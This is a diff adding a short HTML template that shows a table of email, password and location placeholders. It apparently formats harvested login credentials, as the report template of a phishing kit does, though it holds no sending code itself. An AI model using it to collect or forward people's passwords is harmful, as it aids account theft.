@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Table</title>
+</head>
+<body>
+
+    <style>
+
+th, td {
+  padding: 25px;
+  text-align: left;
+  border-bottom: 1px solid #ddd;
+  color: #222;
+}
+tbody tr:nth-child(odd) {
+  background-color: #eee;
+}
+    </style>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>Title</th>
+                <th>Details</th>
+            </tr>
+
+        </thead>
+
+        <tbody>
+            <tr>
+                <td>Email:</td>
+                <td><b>${email}</b></td>
+            </tr>
+
+
+            <tr>
+                <td>Password:</td>
+                <td><b>${pswd}</b></td>
+            </tr>
+
+
+            <tr>
+                <td>Ip Adress:</td>
+                <td><b>${country}</b></td>
+            </tr>
+        </tbody>
+    </table>
+
+</body>
+</html>
